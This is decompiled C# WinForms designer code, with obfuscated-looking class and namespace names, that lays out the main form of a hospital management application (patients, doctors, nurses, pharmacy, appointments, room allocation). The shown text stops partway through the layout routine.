using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.OleDb;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Cd6;
using Mi7;
using Microsoft.VisualBasic.CompilerServices;
using b2S0;
using d2J;
using s8A;
using z2Z;

namespace Yw9;

[DesignerGenerated]
public class Jm5 : Form
{
	private IContainer components;

	private string Flag_select;

	private OleDbConnection con;

	private short search_flag;

	[field: AccessedThroughProperty("FlowLayoutPanel1")]
	internal virtual FlowLayoutPanel FlowLayoutPanel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button4
	{
		[CompilerGenerated]
		get
		{
			return _Button4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = m6T;
			Button button = _Button4;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button4 = value;
			button = _Button4;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button5
	{
		[CompilerGenerated]
		get
		{
			return _Button5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = d2Y;
			Button button = _Button5;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button5 = value;
			button = _Button5;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button6
	{
		[CompilerGenerated]
		get
		{
			return _Button6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Em7;
			Button button = _Button6;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button6 = value;
			button = _Button6;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button7
	{
		[CompilerGenerated]
		get
		{
			return _Button7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Em7;
			Button button = _Button7;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button7 = value;
			button = _Button7;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		[CompilerGenerated]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Hi7;
			Button button = _Button2;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button2 = value;
			button = _Button2;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("FlowLayoutPanel2")]
	internal virtual FlowLayoutPanel FlowLayoutPanel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TextBox TextBox1
	{
		[CompilerGenerated]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = b7Z;
			TextBox textBox = _TextBox1;
			if (textBox != null)
			{
				((Control)textBox).remove_TextChanged(eventHandler);
			}
			_TextBox1 = value;
			textBox = _TextBox1;
			if (textBox != null)
			{
				((Control)textBox).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual ComboBox ComboBox1
	{
		[CompilerGenerated]
		get
		{
			return _ComboBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = i0M;
			ComboBox comboBox = _ComboBox1;
			if (comboBox != null)
			{
				comboBox.remove_SelectedIndexChanged(eventHandler);
			}
			_ComboBox1 = value;
			comboBox = _ComboBox1;
			if (comboBox != null)
			{
				comboBox.add_SelectedIndexChanged(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("FlowLayoutPanel4")]
	internal virtual FlowLayoutPanel FlowLayoutPanel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button9
	{
		[CompilerGenerated]
		get
		{
			return _Button9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Ss1;
			Button button = _Button9;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button9 = value;
			button = _Button9;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button10
	{
		[CompilerGenerated]
		get
		{
			return _Button10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Ss1;
			Button button = _Button10;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button10 = value;
			button = _Button10;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button11
	{
		[CompilerGenerated]
		get
		{
			return _Button11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Ss1;
			Button button = _Button11;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button11 = value;
			button = _Button11;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button12
	{
		[CompilerGenerated]
		get
		{
			return _Button12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Ss1;
			Button button = _Button12;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button12 = value;
			button = _Button12;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button13
	{
		[CompilerGenerated]
		get
		{
			return _Button13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Ss1;
			Button button = _Button13;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button13 = value;
			button = _Button13;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button14
	{
		[CompilerGenerated]
		get
		{
			return _Button14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = m0K;
			Button button = _Button14;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button14 = value;
			button = _Button14;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button8
	{
		[CompilerGenerated]
		get
		{
			return _Button8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Sj3;
			Button button = _Button8;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button8 = value;
			button = _Button8;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button15
	{
		[CompilerGenerated]
		get
		{
			return _Button15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = g5L;
			Button button = _Button15;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button15 = value;
			button = _Button15;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = m3P;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button16
	{
		[CompilerGenerated]
		get
		{
			return _Button16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Be5;
			Button button = _Button16;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button16 = value;
			button = _Button16;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button17
	{
		[CompilerGenerated]
		get
		{
			return _Button17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = t9Y;
			Button button = _Button17;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button17 = value;
			button = _Button17;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	public Jm5()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)t7Q);
		con = new OleDbConnection();
		search_flag = 0;
		w2B();
	}

	[DebuggerNonUserCode]
	protected override void g1L(bool o7Z)
	{
		try
		{
			if (o7Z && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(o7Z);
		}
	}

	[DebuggerStepThrough]
	private void w2B()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_01d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0245: Unknown result type (might be due to invalid IL or missing references)
		//IL_024f: Expected O, but got Unknown
		//IL_0271: Unknown result type (might be due to invalid IL or missing references)
		//IL_0306: Unknown result type (might be due to invalid IL or missing references)
		//IL_0310: Expected O, but got Unknown
		//IL_0334: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d2: Expected O, but got Unknown
		//IL_03f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_049a: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a4: Expected O, but got Unknown
		//IL_04c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_056c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0576: Expected O, but got Unknown
		//IL_059a: Unknown result type (might be due to invalid IL or missing references)
		//IL_063e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0648: Expected O, but got Unknown
		//IL_066c: Unknown result type (might be due to invalid IL or missing references)
		//IL_090b: Unknown result type (might be due to invalid IL or missing references)
		//IL_09d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ac1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0baf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ca0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d91: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e82: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f73: Unknown result type (might be due to invalid IL or missing references)
		//IL_1064: Unknown result type (might be due to invalid IL or missing references)
		//IL_1155: Unknown result type (might be due to invalid IL or missing references)
		//IL_11ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_11d8: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Jm5));
		FlowLayoutPanel1 = new FlowLayoutPanel();
		Button1 = new Button();
		Button4 = new Button();
		Button5 = new Button();
		Button6 = new Button();
		Button7 = new Button();
		Button2 = new Button();
		FlowLayoutPanel2 = new FlowLayoutPanel();
		TextBox1 = new TextBox();
		ComboBox1 = new ComboBox();
		FlowLayoutPanel4 = new FlowLayoutPanel();
		Button9 = new Button();
		Button10 = new Button();
		Button11 = new Button();
		Button12 = new Button();
		Button13 = new Button();
		Button14 = new Button();
		Button15 = new Button();
		Button16 = new Button();
		Button17 = new Button();
		Label1 = new Label();
		Button8 = new Button();
		((Control)FlowLayoutPanel1).SuspendLayout();
		((Control)FlowLayoutPanel4).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)FlowLayoutPanel1).set_BackColor(SystemColors.GradientInactiveCaption);
		((Control)FlowLayoutPanel1).get_Controls().Add((Control)(object)Button1);
		((Control)FlowLayoutPanel1).get_Controls().Add((Control)(object)Button4);
		((Control)FlowLayoutPanel1).get_Controls().Add((Control)(object)Button5);
		((Control)FlowLayoutPanel1).get_Controls().Add((Control)(object)Button6);
		((Control)FlowLayoutPanel1).get_Controls().Add((Control)(object)Button7);
		((Control)FlowLayoutPanel1).get_Controls().Add((Control)(object)Button2);
		((Control)FlowLayoutPanel1).set_Dock((DockStyle)1);
		((Control)FlowLayoutPanel1).set_Location(new Point(0, 0));
		((Control)FlowLayoutPanel1).set_Margin(new Padding(4));
		((Control)FlowLayoutPanel1).set_Name("FlowLayoutPanel1");
		((Control)FlowLayoutPanel1).set_Size(new Size(1060, 142));
		((Control)FlowLayoutPanel1).set_TabIndex(1);
		((ButtonBase)Button1).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button1).set_FlatStyle((FlatStyle)0);
		((ButtonBase)Button1).set_Image((Image)componentResourceManager.GetObject("Button1.Image"));
		((Control)Button1).set_Location(new Point(13, 12));
		((Control)Button1).set_Margin(new Padding(13, 12, 13, 12));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(127, 117));
		((Control)Button1).set_TabIndex(12);
		((ButtonBase)Button1).set_Text("Add patient");
		((ButtonBase)Button1).set_TextAlign((ContentAlignment)512);
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((ButtonBase)Button4).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button4).set_FlatStyle((FlatStyle)0);
		((ButtonBase)Button4).set_Image((Image)componentResourceManager.GetObject("Button4.Image"));
		((Control)Button4).set_Location(new Point(153, 12));
		((Control)Button4).set_Margin(new Padding(0, 12, 13, 12));
		((Control)Button4).set_Name("Button4");
		((Control)Button4).set_Size(new Size(127, 117));
		((Control)Button4).set_TabIndex(1);
		((ButtonBase)Button4).set_Text("Add doctor");
		((ButtonBase)Button4).set_TextAlign((ContentAlignment)512);
		((ButtonBase)Button4).set_UseVisualStyleBackColor(true);
		((ButtonBase)Button5).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button5).set_FlatStyle((FlatStyle)0);
		((ButtonBase)Button5).set_Image((Image)componentResourceManager.GetObject("Button5.Image"));
		((Control)Button5).set_Location(new Point(293, 12));
		((Control)Button5).set_Margin(new Padding(0, 12, 13, 12));
		((Control)Button5).set_Name("Button5");
		((Control)Button5).set_Size(new Size(127, 117));
		((Control)Button5).set_TabIndex(2);
		((Control)Button5).set_Tag((object)"Pharmacist");
		((ButtonBase)Button5).set_Text("Add pharmacist");
		((ButtonBase)Button5).set_TextAlign((ContentAlignment)512);
		((ButtonBase)Button5).set_UseVisualStyleBackColor(true);
		((ButtonBase)Button6).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button6).set_FlatStyle((FlatStyle)0);
		((ButtonBase)Button6).set_Image((Image)componentResourceManager.GetObject("Button6.Image"));
		((Control)Button6).set_Location(new Point(433, 12));
		((Control)Button6).set_Margin(new Padding(0, 12, 13, 12));
		((Control)Button6).set_Name("Button6");
		((Control)Button6).set_Size(new Size(127, 117));
		((Control)Button6).set_TabIndex(3);
		((Control)Button6).set_Tag((object)"Nurse");
		((ButtonBase)Button6).set_Text("Add nurse");
		((ButtonBase)Button6).set_TextAlign((ContentAlignment)512);
		((ButtonBase)Button6).set_UseVisualStyleBackColor(true);
		((ButtonBase)Button7).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button7).set_FlatStyle((FlatStyle)0);
		((ButtonBase)Button7).set_Image((Image)componentResourceManager.GetObject("Button7.Image"));
		((Control)Button7).set_Location(new Point(573, 12));
		((Control)Button7).set_Margin(new Padding(0, 12, 13, 12));
		((Control)Button7).set_Name("Button7");
		((Control)Button7).set_Size(new Size(127, 117));
		((Control)Button7).set_TabIndex(4);
		((Control)Button7).set_Tag((object)"Laboratorist");
		((ButtonBase)Button7).set_Text("Add laboratorist");
		((ButtonBase)Button7).set_TextAlign((ContentAlignment)512);
		((ButtonBase)Button7).set_UseVisualStyleBackColor(true);
		((ButtonBase)Button2).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button2).set_FlatStyle((FlatStyle)0);
		((ButtonBase)Button2).set_Image((Image)componentResourceManager.GetObject("Button2.Image"));
		((Control)Button2).set_Location(new Point(713, 12));
		((Control)Button2).set_Margin(new Padding(0, 12, 13, 12));
		((Control)Button2).set_Name("Button2");
		((Control)Button2).set_Size(new Size(127, 117));
		((Control)Button2).set_TabIndex(6);
		((ButtonBase)Button2).set_Text("Add appointment");
		((ButtonBase)Button2).set_TextAlign((ContentAlignment)512);
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		((ScrollableControl)FlowLayoutPanel2).set_AutoScroll(true);
		((Control)FlowLayoutPanel2).set_BackColor(SystemColors.GradientInactiveCaption);
		((Control)FlowLayoutPanel2).set_Location(new Point(307, 213));
		((Control)FlowLayoutPanel2).set_Name("FlowLayoutPanel2");
		((Control)FlowLayoutPanel2).set_Size(new Size(751, 475));
		((Control)FlowLayoutPanel2).set_TabIndex(2);
		((Control)TextBox1).set_Enabled(false);
		((Control)TextBox1).set_Location(new Point(744, 183));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(232, 22));
		((Control)TextBox1).set_TabIndex(7);
		ComboBox1.set_BackColor(Color.White);
		ComboBox1.set_DropDownStyle((ComboBoxStyle)2);
		((Control)ComboBox1).set_Enabled(false);
		((ListControl)ComboBox1).set_FormattingEnabled(true);
		((Control)ComboBox1).set_Location(new Point(516, 183));
		((Control)ComboBox1).set_Name("ComboBox1");
		((Control)ComboBox1).set_Size(new Size(222, 24));
		((Control)ComboBox1).set_TabIndex(8);
		((Control)FlowLayoutPanel4).set_BackColor(SystemColors.GradientInactiveCaption);
		((Control)FlowLayoutPanel4).get_Controls().Add((Control)(object)Button9);
		((Control)FlowLayoutPanel4).get_Controls().Add((Control)(object)Button10);
		((Control)FlowLayoutPanel4).get_Controls().Add((Control)(object)Button11);
		((Control)FlowLayoutPanel4).get_Controls().Add((Control)(object)Button12);
		((Control)FlowLayoutPanel4).get_Controls().Add((Control)(object)Button13);
		((Control)FlowLayoutPanel4).get_Controls().Add((Control)(object)Button14);
		((Control)FlowLayoutPanel4).get_Controls().Add((Control)(object)Button15);
		((Control)FlowLayoutPanel4).get_Controls().Add((Control)(object)Button16);
		((Control)FlowLayoutPanel4).get_Controls().Add((Control)(object)Button17);
		((Control)FlowLayoutPanel4).set_Location(new Point(0, 183));
		((Control)FlowLayoutPanel4).set_Margin(new Padding(4));
		((Control)FlowLayoutPanel4).set_Name("FlowLayoutPanel4");
		((Control)FlowLayoutPanel4).set_Size(new Size(300, 505));
		((Control)FlowLayoutPanel4).set_TabIndex(9);
		((ButtonBase)Button9).set_BackColor(SystemColors.GradientActiveCaption);
		((Control)Button9).set_Dock((DockStyle)1);
		((ButtonBase)Button9).get_FlatAppearance().set_BorderColor(Color.RoyalBlue);
		((ButtonBase)Button9).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button9).set_FlatStyle((FlatStyle)0);
		((Control)Button9).set_ForeColor(SystemColors.ControlText);
		((ButtonBase)Button9).set_ImageAlign((ContentAlignment)64);
		((Control)Button9).set_Location(new Point(4, 4));
		((Control)Button9).set_Margin(new Padding(4, 4, 4, 1));
		((Control)Button9).set_Name("Button9");
		((Control)Button9).set_Size(new Size(292, 49));
		((Control)Button9).set_TabIndex(0);
		((ButtonBase)Button9).set_Text("Patients");
		((ButtonBase)Button9).set_TextAlign((ContentAlignment)16);
		((ButtonBase)Button9).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button10).set_BackColor(SystemColors.GradientActiveCaption);
		((Control)Button10).set_Dock((DockStyle)1);
		((ButtonBase)Button10).get_FlatAppearance().set_BorderColor(Color.RoyalBlue);
		((ButtonBase)Button10).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button10).set_FlatStyle((FlatStyle)0);
		((Control)Button10).set_ForeColor(SystemColors.ControlText);
		((ButtonBase)Button10).set_ImageAlign((ContentAlignment)64);
		((Control)Button10).set_Location(new Point(4, 55));
		((Control)Button10).set_Margin(new Padding(4, 1, 4, 1));
		((Control)Button10).set_Name("Button10");
		((Control)Button10).set_Size(new Size(292, 49));
		((Control)Button10).set_TabIndex(1);
		((ButtonBase)Button10).set_Text("Doctors");
		((ButtonBase)Button10).set_TextAlign((ContentAlignment)16);
		((ButtonBase)Button10).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button11).set_BackColor(SystemColors.GradientActiveCaption);
		((Control)Button11).set_Dock((DockStyle)1);
		((ButtonBase)Button11).get_FlatAppearance().set_BorderColor(Color.RoyalBlue);
		((ButtonBase)Button11).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button11).set_FlatStyle((FlatStyle)0);
		((Control)Button11).set_ForeColor(SystemColors.ControlText);
		((ButtonBase)Button11).set_ImageAlign((ContentAlignment)64);
		((Control)Button11).set_Location(new Point(4, 106));
		((Control)Button11).set_Margin(new Padding(4, 1, 4, 1));
		((Control)Button11).set_Name("Button11");
		((Control)Button11).set_Size(new Size(292, 49));
		((Control)Button11).set_TabIndex(2);
		((ButtonBase)Button11).set_Text("Pharmacists");
		((ButtonBase)Button11).set_TextAlign((ContentAlignment)16);
		((ButtonBase)Button11).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button12).set_BackColor(SystemColors.GradientActiveCaption);
		((Control)Button12).set_Dock((DockStyle)1);
		((ButtonBase)Button12).get_FlatAppearance().set_BorderColor(Color.RoyalBlue);
		((ButtonBase)Button12).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button12).set_FlatStyle((FlatStyle)0);
		((Control)Button12).set_ForeColor(SystemColors.ControlText);
		((ButtonBase)Button12).set_ImageAlign((ContentAlignment)64);
		((Control)Button12).set_Location(new Point(4, 157));
		((Control)Button12).set_Margin(new Padding(4, 1, 4, 1));
		((Control)Button12).set_Name("Button12");
		((Control)Button12).set_Size(new Size(292, 49));
		((Control)Button12).set_TabIndex(3);
		((ButtonBase)Button12).set_Text("Nurses");
		((ButtonBase)Button12).set_TextAlign((ContentAlignment)16);
		((ButtonBase)Button12).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button13).set_BackColor(SystemColors.GradientActiveCaption);
		((Control)Button13).set_Dock((DockStyle)1);
		((ButtonBase)Button13).get_FlatAppearance().set_BorderColor(Color.RoyalBlue);
		((ButtonBase)Button13).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button13).set_FlatStyle((FlatStyle)0);
		((Control)Button13).set_ForeColor(SystemColors.ControlText);
		((ButtonBase)Button13).set_ImageAlign((ContentAlignment)64);
		((Control)Button13).set_Location(new Point(4, 208));
		((Control)Button13).set_Margin(new Padding(4, 1, 4, 1));
		((Control)Button13).set_Name("Button13");
		((Control)Button13).set_Size(new Size(292, 49));
		((Control)Button13).set_TabIndex(4);
		((ButtonBase)Button13).set_Text("Laboratorists");
		((ButtonBase)Button13).set_TextAlign((ContentAlignment)16);
		((ButtonBase)Button13).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button14).set_BackColor(SystemColors.GradientActiveCaption);
		((Control)Button14).set_Dock((DockStyle)1);
		((ButtonBase)Button14).get_FlatAppearance().set_BorderColor(Color.RoyalBlue);
		((ButtonBase)Button14).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button14).set_FlatStyle((FlatStyle)0);
		((Control)Button14).set_ForeColor(SystemColors.ControlText);
		((ButtonBase)Button14).set_ImageAlign((ContentAlignment)64);
		((Control)Button14).set_Location(new Point(4, 259));
		((Control)Button14).set_Margin(new Padding(4, 1, 4, 1));
		((Control)Button14).set_Name("Button14");
		((Control)Button14).set_Size(new Size(292, 49));
		((Control)Button14).set_TabIndex(5);
		((ButtonBase)Button14).set_Text("Appointments");
		((ButtonBase)Button14).set_TextAlign((ContentAlignment)16);
		((ButtonBase)Button14).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button15).set_BackColor(SystemColors.GradientActiveCaption);
		((Control)Button15).set_Dock((DockStyle)1);
		((ButtonBase)Button15).get_FlatAppearance().set_BorderColor(Color.RoyalBlue);
		((ButtonBase)Button15).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button15).set_FlatStyle((FlatStyle)0);
		((Control)Button15).set_ForeColor(SystemColors.ControlText);
		((ButtonBase)Button15).set_ImageAlign((ContentAlignment)64);
		((Control)Button15).set_Location(new Point(4, 310));
		((Control)Button15).set_Margin(new Padding(4, 1, 4, 1));
		((Control)Button15).set_Name("Button15");
		((Control)Button15).set_Size(new Size(292, 49));
		((Control)Button15).set_TabIndex(6);
		((ButtonBase)Button15).set_Text("RoomAllocation");
		((ButtonBase)Button15).set_TextAlign((ContentAlignment)16);
		((ButtonBase)Button15).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button16).set_BackColor(SystemColors.GradientActiveCaption);
		((Control)Button16).set_Dock((DockStyle)1);
		((ButtonBase)Button16).get_FlatAppearance().set_BorderColor(Color.RoyalBlue);
		((ButtonBase)Button16).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button16).set_FlatStyle((FlatStyle)0);
		((Control)Button16).set_ForeColor(SystemColors.ControlText);
		((ButtonBase)Button16).set_ImageAlign((ContentAlignment)64);
		((Control)Button16).set_Location(new Point(4, 361));
		((Control)Button16).set_Margin(new Padding(4, 1, 4, 1));
		((Control)Button16).set_Name("Button16");
		((Control)Button16).set_Size(new Size(292, 49));
		((Control)Button16).set_TabIndex(7);
		((ButtonBase)Button16).set_Text("Pharmacy");
		((ButtonBase)Button16).set_TextAlign((ContentAlignment)16);
		((ButtonBase)Button16).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button17).set_BackColor(SystemColors.GradientActiveCaption);
		((Control)Button17).set_Dock((DockStyle)1);
		((ButtonBase)Button17).get_FlatAppearance().set_BorderColor(Color.RoyalBlue);
		((ButtonBase)Button17).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button17).set_FlatStyle((FlatStyle)0);
		((Control)Button17).set_ForeColor(SystemColors.ControlText);
		((ButtonBase)Button17).set_ImageAlign((ContentAlignment)64);
		((Control)Button17).set_Location(new Point(4, 412));
		((Control)Button17).set_Margin(new Padding(4, 1, 4, 1));
		((Control)Button17).set_Name("Button17");
		((Control)Button17).set_Size(new Size(292, 49));
		((Control)Button17).set_TabIndex(8);
		((ButtonBase)Button17).set_Text("Change Password");
		((ButtonBase)Button17).set_TextAlign((ContentAlignment)16);
		((ButtonBase)Button17).set_UseVisualStyleBackColor(false);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_Location(new Point(307, 183));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(203, 27));
		((Control)Label1).set_TabIndex(10);
		Label1.set_Text("SEARCH Patients BY");
		Label1.set_TextAlign((ContentAlignment)16);
		((Control)Button8).set_Location(new Point(982, 180));
		((Control)Button8).set_Name("Button8");
		((Control)Button8).set_Size(new Size(76, 27));
		((Control)Button8).set_TabIndex(11);
		((ButtonBase)Button8).set_Text("CLEAR");
		((ButtonBase)Button8).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(1060, 689));
		((Control)this).get_Controls().Add((Control)(object)Button8);
